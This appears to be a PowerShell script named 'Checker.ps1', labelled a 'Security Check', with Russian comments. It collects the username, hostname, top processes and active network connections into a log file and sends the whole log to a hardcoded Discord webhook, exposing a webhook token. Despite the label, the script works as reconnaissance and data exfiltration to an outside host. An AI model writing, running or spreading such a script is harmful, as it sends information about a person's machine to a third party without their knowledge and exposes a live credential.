# === Checker.ps1 ===
$dumpPath = "C:\Temp\Dump"
$logFile = "$dumpPath\report.txt"
$webhookUrl = "https://discord.com/api/webhooks/1400518810921996318/GPMDV5fgPB6s7W2ZYU03q0DxO4zWx5dYKrgnYOg7JomlpuSwIfn9T9IwrlpPzXto6BfZ" 

# Создаём папку для лога
New-Item -Path $dumpPath -ItemType Directory -Force | Out-Null

# Записываем базовую информацию
"🕵️‍♂️ Security Check — $(Get-Date)" | Out-File $logFile -Encoding utf8
"User: $(whoami)" | Out-File $logFile -Append -Encoding utf8
"Hostname: $env:COMPUTERNAME" | Out-File $logFile -Append -Encoding utf8

# Логируем топ 10 процессов по CPU
"`n--- Top Processes by CPU ---" | Out-File $logFile -Append -Encoding utf8
Get-Process | Sort-Object CPU -Descending | Select-Object -First 10 |
    Format-Table -AutoSize | Out-String | Out-File $logFile -Append -Encoding utf8

# Логируем активные TCP-соединения
"`n--- Active Connections ---" | Out-File $logFile -Append -Encoding utf8
netstat -ano | Select-String "ESTABLISHED" | Out-File $logFile -Append -Encoding utf8

# Читаем лог для отправки
$logText = Get-Content -Path $logFile -Raw

# Формируем JSON-пayload для Discord
$payload = @{
    content = "🧾 Новый лог с ПК `$(whoami)`"
    embeds = @(@{
        title       = "Security Log"
        description = "```$logText```"
        color       = 5814783
        footer      = @{ text = "Checker by Марс" }
        timestamp   = (Get-Date).ToString("o")
    })
}

# Отправляем POST-запрос в Discord
Invoke-RestMethod -Uri $webhookUrl -Method Post -Body ($payload | ConvertTo-Json -Depth 4) -ContentType 'application/json'
